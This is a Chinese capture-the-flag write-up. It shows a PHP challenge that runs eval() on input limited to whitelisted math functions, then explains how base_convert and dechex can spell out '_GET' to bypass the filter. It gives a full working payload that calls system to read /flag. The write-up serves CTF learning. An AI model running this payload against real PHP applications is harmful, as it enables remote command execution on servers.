自己好喜欢鸽wp啊，这是一道表面上的"math"题

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

这里主要是构建一个类似这种的

```
c=system("cat /flag") //flag目录结合具体题目
```

1.绕过函数和引号的限制，引号可以删掉，然后函数是可以利用动态函数的性质，即字符串做函数名，加上括号即可被当作函数执行：

```c=($_GET[a])($_GET[b])
c=($_GET[a])($_GET[b])
```

所以目标的payload如下：

```
c=($_GET[a])($_GET[b])&a=system&b=cat /flag
```

白名单用来检测c中出现的变量名，因此a，b不能出现，但是可以用白名单中的值，比如abs，cos。GET中括号和和GET本身都不能出现，中括号可以用{}替代，因此这道题的核心就是构造_GET。构造如下：

```
base_convert(37907361743,10,36)(dechex(1598506324))
```

base_convert(37907361743,10,36)=>"hex2bin"，dechex(1598506324)=>"5f474554",hex2bin("5f474554")=>_GET

最后的payload

```
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag
```

这里用$pi作为_GET传参

这里将一个绕过

```php
 preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
```

这里是讲对于所有ascii码内的字符进行匹配，上述payload匹配出来为pi base_convert dechex pi pi pi cos

感觉关键点就是构造_GET,然后绕过，不过对于一种新的传参方式c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos}) 有了新的认识

## php动态函数调用方法

------

php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数